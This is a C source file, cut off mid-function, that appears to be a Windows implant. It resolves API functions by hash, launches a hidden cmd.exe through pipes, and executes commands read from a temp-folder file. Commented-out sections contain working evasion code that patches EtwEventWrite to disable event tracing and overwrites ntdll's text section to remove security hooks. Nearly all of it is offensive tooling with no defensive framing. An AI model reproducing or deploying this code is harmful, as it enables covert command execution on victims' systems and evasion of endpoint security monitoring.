#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"

#define _WIN32_WINNT 0x0501
#include <windows.h>
#define BUFF_SIZE 4096
#define MAX_CMD_SIZE 1024
const int MAX_STRING = 4096;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define bool    _Bool
#define true    1
#define false   0

typedef HMODULE(WINAPI *FuncLoadLibraryA)(
    _In_z_ LPTSTR lpFileName);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(NTAPI * NtClose_t)(HANDLE);
typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);
typedef HANDLE(WINAPI *CreateFile_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef SIZE_T(WINAPI *VirtualQuery_t)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef BOOL(WINAPI *FlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
typedef BOOL (WINAPI * CreateProcess_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI * CreatePipe_t)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI * SetHandleInformation_t)(HANDLE, DWORD, DWORD);
typedef BOOL (WINAPI * WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI * ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI * GetTempPath_t)(DWORD nBufferLength, LPSTR lpBuffer);
typedef HANDLE (WINAPI *GetCurrentProcess_t)(void);
typedef BOOL (WINAPI * CloseHandle_t)(HANDLE);
typedef DWORD (WINAPI * GetFileAttributesA_t)(LPCSTR);
typedef DWORD (WINAPI * GetFileSize_t)(HANDLE, LPDWORD);
typedef BOOL (WINAPI * DeleteFileA_t)(LPCSTR);
typedef int (WINAPI * lstrlenA_t)(LPCSTR);
typedef int (WINAPI * lstrcmpA_t)(LPCSTR, LPCSTR);
typedef LPVOID (WINAPI *HeapAlloc_t)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
typedef BOOL (WINAPI *HeapFree_t)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
typedef HANDLE (WINAPI *GetProcessHeap_t)(void);
typedef VOID (WINAPI *Sleep_t)(DWORD dwMilliseconds);

typedef HANDLE (WINAPI *GETSTDHANDLE_t)(DWORD nStdHandle);
typedef BOOL (WINAPI *WRITECONSOLEA_t)(HANDLE hConsoleOutput, const VOID *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);

/*
unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sNtProtectVirtualMemory[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
unsigned char sCreateFile[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
unsigned char sNtClose[] = { 'N', 't', 'C', 'l', 'o', 's', 'e', 0x0 };
unsigned char sCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x0 };
unsigned char sCreatePipe[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'i', 'p', 'e', 0x0 };
unsigned char sSetHandleInformation[] = { 'S', 'e', 't', 'H', 'a', 'n', 'd', 'l', 'e', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 0x0 };
unsigned char sWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
unsigned char sReadFile[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x0 };
unsigned char sGetTempPath[] = { 'G', 'e', 't', 'T', 'e', 'm', 'p', 'P', 'a', 't', 'h', 'A', 0x0 };
unsigned char sVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
unsigned char sFlushInstructionCache[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e', 0x0 };
unsigned char sGetCurrentProcess[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
unsigned char sCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
unsigned char sGetFileAttributesA[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
unsigned char sGetFileSize[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x0 };
unsigned char sDeleteFileA[] = { 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
unsigned char slstrlenA[] = { 'l', 's', 't', 'r', 'l', 'e', 'n', 'A', 0x0 };
unsigned char slstrcmpA[] = { 'l', 's', 't', 'r', 'c', 'm', 'p', 'A', 0x0 };
unsigned char sHeapAlloc[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c', 0x0 };
unsigned char sHeapFree[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e', 0x0 };
unsigned char sGetProcessHeap[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p', 0x0 };
unsigned char sSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
*/

// Global variables for pipe handles
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

void simple_memcpy(char* dest, const char* src, size_t count) {
    for (size_t i = 0; i < count; ++i) {
        dest[i] = src[i];
    }
}

/*
int CheckETW(void) {
	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtProtectVirtualMemory);
	VirtualQuery_t pVirtualQuery = (VirtualQuery_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualQuery);
	FlushInstructionCache_t pFlushInstructionCache = (FlushInstructionCache_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sFlushInstructionCache);
	GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetCurrentProcess);

	unsigned char sEtwEventWrite[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0x0 };
	
	void* pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)sEtwEventWrite);
	if (pEventWrite == NULL) {
		//printf("Failed to get address of EtwEventWrite. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	MEMORY_BASIC_INFORMATION mbi;
	if (!pVirtualQuery(pEventWrite, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
		//printf("VirtualQuery failed. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	NTSTATUS status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), PAGE_EXECUTE_READWRITE, &oldprotect);
	if (status != STATUS_SUCCESS) {
		//printf("Failed to change memory protection. Error: 0x%08x\n", status);
		return -1;
	}

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif

	status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), oldprotect, &oldprotect);
	if (status != STATUS_SUCCESS) {
		//printf("Failed to restore memory protection. Error: 0x%08x\n", status);
		return -1;
	}

	pFlushInstructionCache(pGetCurrentProcess(), pEventWrite, mbi.RegionSize);
	return 0;
}

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
	int i;
	
	unsigned char sTEXT[] = {'.', 't', 'e', 'x', 't', 0x0 };
	
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtProtectVirtualMemory);
	GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetCurrentProcess);
	
	SIZE_T size;
	PVOID addr;
	NTSTATUS status;
	
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, (LPCSTR) sTEXT)) {
			addr = (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress);
			size = pImgSectionHead->Misc.VirtualSize;
			status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &addr, &size, PAGE_EXECUTE_READWRITE, &oldprotect);
			
			if (!NT_SUCCESS(status)) {
				//printf("NTVirtProtect part 1 in Unhook failed");
				return -1;
			}

			simple_memcpy((char*)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
              (char*)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
              pImgSectionHead->Misc.VirtualSize);


			status = NtProtectVirtualMemory_p(pGetCurrentProcess(), &addr, &size, oldprotect, &oldprotect);

			if (!NT_SUCCESS(status)) {
				//printf("NTVirtProtect part 2 in Unhook failed");
				return -1;
			}

			return 0;
		}
	}

	return -1;
}

int MapandUnhook(LPCSTR filepath, LPCSTR moduleName) {

	int ret = 0;
	HANDLE hFile; 
	HANDLE hFileMapping;
	LPVOID pMapping;
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
    NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtClose);
	CreateFile_t pCreateFile = (CreateFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFile);

	
	hFile = pCreateFile((LPCSTR) filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			return -1;
	}
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) {
			pNtClose(hFile);
			return -1;
	}
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
					pNtClose(hFileMapping);
					pNtClose(hFile);
					return -1;
	}
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) moduleName), pMapping);
	UnmapViewOfFile_p(pMapping);
	//printf("unhooked\n");
	pNtClose(hFileMapping);
	pNtClose(hFile);
	return 0;
}

*/


void CreateChildProcess() { 
   
   //CreateProcess_t pCreateProcess = (CreateProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateProcess);
   CreateProcess_t pCreateProcess = (CreateProcess_t) GetProcAddressWithHash( 0x863FCC79 );

   //NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtClose);
   NtClose_t pNtClose = (NtClose_t) GetProcAddressWithHash( 0xA198FDF1 );

   PROCESS_INFORMATION piProcInfo; 
   STARTUPINFO siStartInfo;
   BOOL bSuccess = FALSE; 

   SecureZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
   SecureZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
   
   siStartInfo.cb = sizeof(STARTUPINFO); 
   siStartInfo.hStdError = g_hChildStd_OUT_Wr;
   siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
   siStartInfo.hStdInput = g_hChildStd_IN_Rd;
   siStartInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   siStartInfo.wShowWindow = SW_HIDE;

   unsigned char sCMD[] = {'c', 'm', 'd', '.', 'e', 'x', 'e', 0x0 };

   bSuccess = pCreateProcess(NULL, 
      (LPSTR) sCMD,       
      NULL,          
      NULL,          
      TRUE,          
      CREATE_NO_WINDOW,             
      NULL,          
      NULL,          
      &siStartInfo,  
      &piProcInfo);  

   if (!bSuccess) 
		return;
   else {
      pNtClose(piProcInfo.hProcess);
      pNtClose(piProcInfo.hThread);
   }
}

void CreatePipes() {
	
	//CreatePipe_t pCreatePipe = (CreatePipe_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreatePipe);
	CreatePipe_t pCreatePipe = (CreatePipe_t) GetProcAddressWithHash( 0x0EAFCF3E );

	//SetHandleInformation_t pSetHandleInformation = (SetHandleInformation_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sSetHandleInformation);
	SetHandleInformation_t pSetHandleInformation = (SetHandleInformation_t) GetProcAddressWithHash( 0x1CD313CA );

    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT
    if (! pCreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
        return;
    }

    // Ensure the read handle to the pipe for STDOUT is not inherited
    if (! pSetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
        return;
    }

    // Create a pipe for the child process's STDIN 
    if (! pCreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
        return;
    }

    // Ensure the write handle to the pipe for STDIN is not inherited
    if (! pSetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
        return;
    }
}

void WriteToPipe(const char* cmd) { 
   //WriteFile_t pWriteFile = (WriteFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteFile);
   WriteFile_t pWriteFile = (WriteFile_t) GetProcAddressWithHash( 0x5BAE572D );
   
   char buffer[MAX_CMD_SIZE];
   int cmdLength = 0;
   while (*cmd && cmdLength < MAX_CMD_SIZE - 13) // 13 = length of "\nEND_OF_CMD\n" + 1 for null terminator
   {
       buffer[cmdLength++] = *cmd++;
   }

   char endCmd[] = "\nEND_OF_CMD\n";
   for (int i = 0; i < 12 && cmdLength < MAX_CMD_SIZE; i++) 
   {
       buffer[cmdLength++] = endCmd[i];
   }

   buffer[cmdLength] = 0;  // Null terminate the string

   DWORD dwWritten; 
   BOOL bSuccess = pWriteFile(g_hChildStd_IN_Wr, buffer, cmdLength, &dwWritten, NULL);
   if (!bSuccess) 
		return;
}

char* my_strstr(const char* haystack, const char* needle) {
    if (!*needle) return (char*)haystack;
    for (; *haystack; ++haystack) {
        const char* h = haystack;
        const char* n = needle;
        while (*h && *n && (*h == *n)) {
            ++h;
            ++n;
        }
        if (!*n) return (char*)haystack;
    }
    return NULL;
}

char* ReadFromPipe() {
	
	//ReadFile_t pReadFile = (ReadFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sReadFile);
	ReadFile_t pReadFile = (ReadFile_t) GetProcAddressWithHash( 0xBB5F9EAD );	
	
	//HeapAlloc_t pHeapAlloc = (HeapAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sHeapAlloc);
	HeapAlloc_t pHeapAlloc = (HeapAlloc_t) GetProcAddressWithHash( 0x54903EDB );	
		
	//HeapFree_t pHeapFree = (HeapFree_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sHeapFree);
	HeapFree_t pHeapFree = (HeapFree_t) GetProcAddressWithHash( 0xC35F9CF3 );	

	//GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetProcessHeap);
	GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t) GetProcAddressWithHash( 0xF8245751 );

    // Allocate memory on the heap
    char* cmdOutput = (char*) pHeapAlloc(pGetProcessHeap(), 0, MAX_STRING);
    if (!cmdOutput) {
        // Allocation failed. Return or handle error as appropriate.
        return NULL;
    }
	CHAR* chBuf = (CHAR*) pHeapAlloc(pGetProcessHeap(), 0, BUFF_SIZE);
    if (!chBuf) {
        // Allocation failed. Free cmdOutput and return or handle error as appropriate.
        pHeapFree(pGetProcessHeap(), 0, cmdOutput);
        return NULL;
    }
    //static char cmdOutput[MAX_STRING];
    int cmdOutputIndex = 0; // index to write into cmdOutput

	
    DWORD dwRead; 
    //CHAR chBuf[BUFF_SIZE];
    BOOL bSuccess = FALSE;

    for (;;) 
    { 
        bSuccess = pReadFile( g_hChildStd_OUT_Rd, chBuf, BUFF_SIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) 
        {
            // Error handling - You can comment this if you want silent operation
            // WriteConsole(GetStdHandle(STD_ERROR_HANDLE), "ReadFile failed\n", 14, NULL, NULL);
            break;
        }

        // Append chBuf to cmdOutput
        for (DWORD i = 0; i < dwRead; ++i)
        {
            cmdOutput[cmdOutputIndex++] = chBuf[i];
        }

        // Ensure null-termination
        cmdOutput[cmdOutputIndex] = '\0';

        // If the end signal is found, remove it and stop reading.
        char* endSignal = my_strstr(cmdOutput, "END_OF_CMD");
        if (endSignal != NULL) 
        {
            *endSignal = '\0'; // null-terminate the string at the end signal
            break;
        }
    }
	
    pHeapFree(pGetProcessHeap(), 0, chBuf);

    return cmdOutput;
}

//const size_t MAX_FILE_PATH = MAX_PATH + 20;  // Room for path + filename
#define MAX_FILE_PATH (MAX_PATH + 20)

char g_pathInputFile[MAX_FILE_PATH];
char g_pathOutputFile[MAX_FILE_PATH];

void initializeTempFilePaths() {
	
	//GetTempPath_t pGetTempPath = (GetTempPath_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetTempPath);
	GetTempPath_t pGetTempPath = (GetTempPath_t) GetProcAddressWithHash( 0xE449F330 );
	
    unsigned char sINPUT[] = {'i', 'n', 'p', 'u', 't', '.', 't', 'x', 't', 0x0 };
    unsigned char sOUTPUT[] = {'o', 'u', 't', 'p', 'u', 't', '.', 't', 'x', 't', 0x0 };

    char tempPath[MAX_PATH];
    pGetTempPath(MAX_PATH, tempPath);
    char* tempPathPtr = tempPath;

    char* dest;

    // For pathInputFile
    dest = g_pathInputFile;
    while (*tempPathPtr) {
        *dest++ = *tempPathPtr++;
    }
    unsigned char* inputSrc = sINPUT;
    while (*inputSrc) {
        *dest++ = *inputSrc++;
    }
    *dest = 0x0;

    // For pathOutputFile
    tempPathPtr = tempPath;  // Reset pointer
    dest = g_pathOutputFile;
    while (*tempPathPtr) {
        *dest++ = *tempPathPtr++;
    }
    unsigned char* outputSrc = sOUTPUT;
    while (*outputSrc) {
        *dest++ = *outputSrc++;
    }
    *dest = 0x0;
}

void writeFile(const char* filePath, const char* data) {

	//CreateFile_t pCreateFile = (CreateFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFile);
	CreateFile_t pCreateFile = (CreateFile_t) GetProcAddressWithHash( 0x4FDAF6DA );

    //WriteFile_t pWriteFile = (WriteFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteFile);
    WriteFile_t pWriteFile = (WriteFile_t) GetProcAddressWithHash( 0x5BAE572D );
   
	//lstrlenA_t plstrlenA = (lstrlenA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) slstrlenA);
	lstrlenA_t plstrlenA = (lstrlenA_t) GetProcAddressWithHash( 0xCC8E00F4 );

	//CloseHandle_t pCloseHandle = (CloseHandle_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCloseHandle);
	
    //NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtClose);
    NtClose_t pNtClose = (NtClose_t) GetProcAddressWithHash( 0xA198FDF1 );

    HANDLE hFile = pCreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        pWriteFile(hFile, data, plstrlenA(data), &bytesWritten, NULL);
        //pCloseHandle(hFile);
		pNtClose(hFile);

    }
}

bool fileExists(const char* filePath) {
	
	//GetFileAttributesA_t pGetFileAttributesA = (GetFileAttributesA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetFileAttributesA);
	GetFileAttributesA_t pGetFileAttributesA = (GetFileAttributesA_t) GetProcAddressWithHash( 0x5B01CE93 );
	
    DWORD dwAttrib = pGetFileAttributesA(filePath);
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

char* readFile(const char* filePath) {
	
	//CreateFile_t pCreateFile = (CreateFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFile);
	CreateFile_t pCreateFile = (CreateFile_t) GetProcAddressWithHash( 0x4FDAF6DA );
	
	//GetFileSize_t pGetFileSize = (GetFileSize_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetFileSize);
   	GetFileSize_t pGetFileSize = (GetFileSize_t) GetProcAddressWithHash( 0x701E12C6 );

	//ReadFile_t pReadFile = (ReadFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sReadFile);
	ReadFile_t pReadFile = (ReadFile_t) GetProcAddressWithHash( 0xBB5F9EAD );
	
	//CloseHandle_t pCloseHandle = (CloseHandle_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCloseHandle);
	
    //NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sNtClose);
    NtClose_t pNtClose = (NtClose_t) GetProcAddressWithHash( 0xA198FDF1 );
	
	//HeapAlloc_t pHeapAlloc = (HeapAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sHeapAlloc);
	HeapAlloc_t pHeapAlloc = (HeapAlloc_t) GetProcAddressWithHash( 0x54903EDB );
	
	//GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetProcessHeap);
	GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t) GetProcAddressWithHash( 0xF8245751 );	

	//GETSTDHANDLE_t pGetStdHandle = (GETSTDHANDLE_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetStdHandle);
	GETSTDHANDLE_t pGetStdHandle = (GETSTDHANDLE_t) GetProcAddressWithHash( 0x53CABB18 );

	//WRITECONSOLEA_t pWriteConsoleA = (WRITECONSOLEA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteConsoleA);
	WRITECONSOLEA_t pWriteConsoleA = (WRITECONSOLEA_t) GetProcAddressWithHash( 0x5DCB5D71 );

    HANDLE hFile = pCreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    DWORD fileSize = pGetFileSize(hFile, NULL);
	
	HANDLE hConsole = pGetStdHandle(STD_OUTPUT_HANDLE);
	char message[] = {'H', 'e','l', 'l', 'o', ',', ' ', 'W', 'o', 'r', 'l', 'd', '!', '\r', '\n', 0};
	DWORD written;
	pWriteConsoleA(hConsole, message, sizeof(message) - 1, &written, NULL);
	
	if (!pGetProcessHeap || !pHeapAlloc) {
		
	    char message01[] = {'h', 'e', 'a', 'p', ' ', 'i', 'n', 'i', 't', '\r', '\n', 0};
		DWORD written1;
		pWriteConsoleA(hConsole, message01, sizeof(message01) - 1, &written1, NULL);
		// Handle the error, such as by printing an error message and exiting.
}
	
    char* buffer = (char*) pHeapAlloc(pGetProcessHeap(), 0, fileSize + 1);

	pWriteConsoleA(hConsole, message, sizeof(message) - 1, &written, NULL);

	
	DWORD bytesRead;
    pReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    buffer[bytesRead] = '\0';  // Null-terminate the string



    //pCloseHandle(hFile);
    pNtClose(hFile);
	
    return buffer;
}

void deleteFile(const char* filePath) {
	
	//DeleteFileA_t pDeleteFileA = (DeleteFileA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sDeleteFileA);
	DeleteFileA_t pDeleteFileA = (DeleteFileA_t) GetProcAddressWithHash( 0x13DD2ED7 );
	
	pDeleteFileA(filePath);
}

bool readCommandFileAndExecute(const char* pathInputFile, const char* pathOutputFile) {
	
	//lstrlenA_t plstrlenA = (lstrlenA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) slstrlenA);
	lstrlenA_t plstrlenA = (lstrlenA_t) GetProcAddressWithHash( 0xCC8E00F4 );
	
	//lstrcmpA_t plstrcmpA = (lstrcmpA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) slstrcmpA);
	lstrcmpA_t plstrcmpA = (lstrcmpA_t) GetProcAddressWithHash( 0xDC8D7174 );

	//HeapFree_t pHeapFree = (HeapFree_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sHeapFree);
	HeapFree_t pHeapFree = (HeapFree_t) GetProcAddressWithHash( 0xC35F9CF3 );
	
	//GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetProcessHeap);
	GetProcessHeap_t pGetProcessHeap = (GetProcessHeap_t) GetProcAddressWithHash( 0xF8245751 );
	
	//Sleep_t pSleep = (Sleep_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sSleep);
	Sleep_t pSleep = (Sleep_t) GetProcAddressWithHash( 0xE035F044 );
	
	//GETSTDHANDLE_t pGetStdHandle = (GETSTDHANDLE_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetStdHandle);
	GETSTDHANDLE_t pGetStdHandle = (GETSTDHANDLE_t) GetProcAddressWithHash( 0x53CABB18 );

	//WRITECONSOLEA_t pWriteConsoleA = (WRITECONSOLEA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteConsoleA);
	WRITECONSOLEA_t pWriteConsoleA = (WRITECONSOLEA_t) GetProcAddressWithHash( 0x5DCB5D71 );


	
    if (fileExists(pathInputFile)) {
		
		
        char* cmd = readFile(pathInputFile);
        
		
        if (!cmd) return true;

		int lengthOfCmd = plstrlenA(cmd);
		if (lengthOfCmd >= 4) {
			char tempBuffer[5] = {0};
			simple_memcpy(tempBuffer, cmd, 4);

